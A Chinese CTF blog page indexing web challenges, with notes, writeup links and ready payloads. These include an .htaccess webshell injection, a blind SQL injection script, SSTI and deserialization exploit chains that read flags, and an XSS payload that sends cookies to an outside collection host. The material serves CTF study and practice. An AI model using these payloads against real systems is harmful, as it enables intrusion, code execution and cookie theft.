<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>V&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:type" content="website">
<meta property="og:title" content="V&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="V&#39;s blog">
<meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="V&#39;s blog">
<meta name="twitter:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
  
    <link rel="alternate" href="/atom.xml" title="V&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">V&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Daily life of a rookie</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-题目导航(手动置顶)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2099/12/31/题目导航(手动置顶)/" class="article-date">
  <time datetime="2099-12-31T15:59:59.000Z" itemprop="datePublished">2099-12-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2099/12/31/题目导航(手动置顶)/">题目导航(手动置顶)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="题目导航-手动置顶"><a href="#题目导航-手动置顶" class="headerlink" title="题目导航(手动置顶)"></a>题目导航(手动置顶)</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base64-trick"><a href="#base64-trick" class="headerlink" title="base64_trick"></a>base64_trick</h3><h4 id="赛博杯：base-1"><a href="#赛博杯：base-1" class="headerlink" title="赛博杯：base_1"></a>赛博杯：base_1</h4><p>base64加解密原理特性</p>
<h3 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h3><h4 id="赛博杯：truncation"><a href="#赛博杯：truncation" class="headerlink" title="赛博杯：truncation"></a>赛博杯：truncation</h4><p>脚本post模板：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       <span class="comment">#html解析器</span></span><br><span class="line">url=<span class="string">""</span>    <span class="comment">#目标url</span></span><br><span class="line"></span><br><span class="line">session=requests.session()          <span class="comment">#获取一个session对象</span></span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  <span class="comment">#返回的页面</span></span><br><span class="line">soup=BeautifulSoup(html,'html.parser')</span><br><span class="line"></span><br><span class="line">formData=&#123;<span class="string">""</span>:<span class="string">""</span>,<span class="string">""</span>:<span class="string">""</span>&#125;<span class="comment">#构建一个formData字典，用于传我们的</span></span><br><span class="line">re2=session.post(url,data=formData)<span class="comment">#post过去</span></span><br><span class="line"></span><br><span class="line">if(<span class="string">""</span>  in re2.text):</span><br><span class="line">	print(re2.text)</span><br></pre></td></tr></table></figure>

<h4 id="HCTF：Warm-UP"><a href="#HCTF：Warm-UP" class="headerlink" title="HCTF：Warm UP"></a>HCTF：Warm UP</h4><h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h4><p>wp:<a href="https://xz.aliyun.com/t/6458" target="_blank" rel="noopener">https://xz.aliyun.com/t/6458</a></p>
<p>data协议控制file_get_contents所包含文件内容：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>]; </span><br><span class="line">file_get_contents($text,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">?<span class="keyword">text</span>=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure>

<h4 id="X-NUCA-Ezphp"><a href="#X-NUCA-Ezphp" class="headerlink" title="X-NUCA Ezphp"></a>X-NUCA Ezphp</h4><p>php trick  （配置文件）</p>
<p>wp：<a href="https://evi0s.com/2019/08/30/x-nuca-2019-web-wp/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/x-nuca-2019-web-wp/</a></p>
<p>非预期payload：<code>?filename=.htaccess&amp;content=php_value auto_prepend_fi\%0ale .htaccess%0a%23%20&lt;?php eval($_GET[vanish]); ?&gt;%0a%23vanish\</code></p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="强网杯：随便注"><a href="#强网杯：随便注" class="headerlink" title="强网杯：随便注"></a>强网杯：随便注</h4><p>堆叠注入、sql预编译</p>
<h4 id="CISCN2019-华北赛区-：Hack-World"><a href="#CISCN2019-华北赛区-：Hack-World" class="headerlink" title="CISCN2019 华北赛区 ：Hack World"></a>CISCN2019 华北赛区 ：Hack World</h4><p>时间盲注</p>
<p>模板</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table=<span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> table:</span><br><span class="line">        ss = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">''</span><span class="string">'ELT(left((select column_name from table_name),&#123;&#125;)='</span>&#123;&#125;&#123;&#125;<span class="string">',SLEEP(1))'</span><span class="string">''</span>.format(len(flag)+<span class="number">1</span>,flag, i)</span><br><span class="line">        &#125;</span><br><span class="line">        #<span class="keyword">data</span>[<span class="string">'id'</span>] = <span class="keyword">data</span>[<span class="string">'id'</span>].replace(<span class="string">" "</span>,<span class="string">"\t"</span>)		\t代替空格绕过waf</span><br><span class="line">        r=requests.post(url,<span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-ss&gt;=<span class="number">1</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print (flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h3 id="批量文件shell测试"><a href="#批量文件shell测试" class="headerlink" title="批量文件shell测试"></a>批量文件shell测试</h3><h4 id="强网杯：高明的黑客"><a href="#强网杯：高明的黑客" class="headerlink" title="强网杯：高明的黑客"></a>强网杯：高明的黑客</h4><p>链接：<a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="赛博杯：Simple-XXE"><a href="#赛博杯：Simple-XXE" class="headerlink" title="赛博杯：Simple XXE"></a>赛博杯：Simple XXE</h4><p>xml外部实体注入漏洞</p>
<p>链接：<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a></p>
<p><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
<h4 id="OGeek-LookAround"><a href="#OGeek-LookAround" class="headerlink" title="OGeek: LookAround"></a>OGeek: LookAround</h4><p>下载所提示的镜像，根据本地DTD来实现XXE</p>
<p>链接：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p>
<p><a href="https://www.zhaoj.in/read-6251.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6251.html</a></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="赛博杯：inclusion"><a href="#赛博杯：inclusion" class="headerlink" title="赛博杯：inclusion"></a>赛博杯：inclusion</h4><p>php文件包含漏洞（利用phpinfo）</p>
<p>链接：<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></p>
<h3 id="SSTI（模板注入）"><a href="#SSTI（模板注入）" class="headerlink" title="SSTI（模板注入）"></a>SSTI（模板注入）</h3><h4 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h4><p>wp：<a href="http://www.l-team.org/archives/375.html" target="_blank" rel="noopener">http://www.l-team.org/archives/375.html</a></p>
<p>ruby模板注入+预定义的变量<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html" target="_blank" rel="noopener">https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html</a></p>
<p>jwt</p>
<h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h4><p>render</p>


<p>链接：<a href="https://blog.csdn.net/weixin_44677409/article/details/94410580" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/94410580</a></p>
<h4 id="Ogeek：Render"><a href="#Ogeek：Render" class="headerlink" title="Ogeek：Render"></a>Ogeek：Render</h4><p>链接：<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</a></p>
<p>Thymeleaf 渲染</p>
<p>Java读文件一把梭：</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"content"</span>:<span class="type"></span>"[[$&#123;<span class="keyword">new</span> <span class="type">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="type">java</span>.io.FileReader(\<span class="string">"/flag\")).readLine()&#125;]]"</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="tokyo-shrine"><a href="#tokyo-shrine" class="headerlink" title="tokyo: shrine"></a>tokyo: shrine</h4><p>链接：<a href="https://ctftime.org/writeup/10895" target="_blank" rel="noopener">https://ctftime.org/writeup/10895</a></p>
<p>SSTI读config中内容的各种姿势</p>




<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">59</span>](<span class="link"></span>).<span class="emphasis">_module._</span><span class="emphasis">_builtins_</span><span class="emphasis">_['_</span><span class="emphasis">_import_</span><span class="emphasis">_']("os")._</span><span class="emphasis">_dict_</span>_.environ['FLAG']</span><br><span class="line"></span><br><span class="line">().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">59</span>].<span class="strong">__init__</span>.func<span class="emphasis">_globals.values()[13]['eval']('_</span><span class="emphasis">_import_</span><span class="emphasis">_("os")._</span><span class="emphasis">_dict_</span>_.environ['FLAG']</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[].<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[68].<span class="strong">__init__</span>.<span class="strong">__globals__</span>['os'].<span class="strong">__dict__</span>.environ['FLAG']</span><br></pre></td></tr></table></figure>

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反序列化，任意命令执行"><a href="#反序列化，任意命令执行" class="headerlink" title="反序列化，任意命令执行"></a>反序列化，任意命令执行</h3><h4 id="moectf：Object"><a href="#moectf：Object" class="headerlink" title="moectf：Object"></a>moectf：Object</h4><p>闭合eval执行任意命令；var_dump(getallheaders());</p>
<h4 id="piapiapia"><a href="#piapiapia" class="headerlink" title="piapiapia"></a>piapiapia</h4><p>正则替换引起的反序列化字符溢出从而造成任意文件读取</p>
<h4 id="第五空间：八苦"><a href="#第五空间：八苦" class="headerlink" title="第五空间：八苦"></a>第五空间：八苦</h4><ol>
<li><p>phpinfo-&gt; preload.php</p>
</li>
<li><p>闭合eval；任意命令执行</p>
<p>读文件一把梭：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="variable">$fp</span> = fopen(<span class="string">"./index.php"</span>,<span class="string">"r"</span>);<span class="variable">$str</span> = fread(<span class="variable">$fp</span>,filesize(<span class="string">"./index.php"</span>));<span class="built_in">echo</span> <span class="variable">$str</span> = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">1;<span class="built_in">echo</span> readfile(<span class="string">"./index.php"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>bypass open_basedir</p>
<p>链接：<a href="https://blog.csdn.net/systemino/article/details/94645518" target="_blank" rel="noopener">https://blog.csdn.net/systemino/article/details/94645518</a></p>
<p>LCTF</p>
</li>
</ol>
<h4 id="LCTF-bestphp’s-revenge"><a href="#LCTF-bestphp’s-revenge" class="headerlink" title="LCTF:bestphp’s revenge"></a>LCTF:bestphp’s revenge</h4><p>php SESSION 反序列化机制 </p>
<p>SoapClient</p>
<h4 id="CISCN2019-总决赛-Day1-Web4-Laravel1【未解决】"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1【未解决】" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1【未解决】"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1【未解决】</h4><p>大代码审计，找pop链反序列化。（还没审计，直接挂exp了先，</p>
<p>wp:<a href="https://xz.aliyun.com/t/5816#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5816#toc-0</a> </p>
<p>,感觉可以拿来打AWD了……）</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">ProxyAdapter</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $key;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $value;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $isHit = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $expiry;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $defaultLifetime;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $metadata = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $newMetadata = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $innerItem;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $poolHash;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $isTaggable = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;expiry = <span class="string">'sjdjfkas'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;poolHash = <span class="string">'123'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;key = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Ldap</span>\<span class="title">Adapter</span>\<span class="title">ExtLdap</span>\<span class="title">Adapter</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $file;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $namespace;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $namespaceLen;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $createCacheItem;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $setInnerItem;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $poolHash;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $pool;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> ChainAdapter();</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;createCacheItem = <span class="string">'call_user_func'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;namespace = <span class="string">'phpinfo'</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $deferred = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $createCacheItem;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $setCacheItemTags;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $getTagsByKey;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $invalidateTags;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $tags;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $knownTagVersions = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $knownTagVersionsTtl;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $pool;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'flight'</span> =&gt; <span class="keyword">new</span> CacheItem());</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">TagAwareAdapter</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $obj = <span class="keyword">new</span> TagAwareAdapter();</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> urlencode(serialize($obj));</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="CISCN2019-华东北赛区：Web2"><a href="#CISCN2019-华东北赛区：Web2" class="headerlink" title="CISCN2019 华东北赛区：Web2"></a>CISCN2019 华东北赛区：Web2</h4><p>self-xss</p>
<p>sql注入</p>
<p>模板</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location.href=<span class="string">'http://xss.buuoj.cn/index.php?do=api&amp;id=gX96WJ&amp;location='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;toplocation='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> top.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.cookie&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;opener='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span>(<span class="built_in">window</span>.opener&amp;&amp;<span class="built_in">window</span>.opener.location.href)?<span class="built_in">window</span>.opener.location.href:<span class="string">''</span>&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>

<p>HTML MarkUp绕过waf</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">in_str = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">output</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> in_str:</span><br><span class="line">    <span class="built_in">output</span> += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + <span class="built_in">output</span> + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Hash拓展攻击"><a href="#Hash拓展攻击" class="headerlink" title="Hash拓展攻击"></a>Hash拓展攻击</h3><h4 id="De1CTF2019：SSRF-ME"><a href="#De1CTF2019：SSRF-ME" class="headerlink" title="De1CTF2019：SSRF ME"></a>De1CTF2019：SSRF ME</h4><p>多解：PHPtrick</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="BUUOJ：SSRF-me"><a href="#BUUOJ：SSRF-me" class="headerlink" title="BUUOJ：SSRF me"></a>BUUOJ：SSRF me</h4><p>file协议只是open函数执行系统命令</p>
<h4 id="BUUOJ：-SSRF"><a href="#BUUOJ：-SSRF" class="headerlink" title="BUUOJ： SSRF"></a>BUUOJ： SSRF</h4><p>报错（信息泄露）注入</p>
<p>union select去执行ssrf</p>
<h3 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h3><h4 id="HCTF-admin"><a href="#HCTF-admin" class="headerlink" title="HCTF: admin"></a>HCTF: admin</h4><p>二次注入</p>
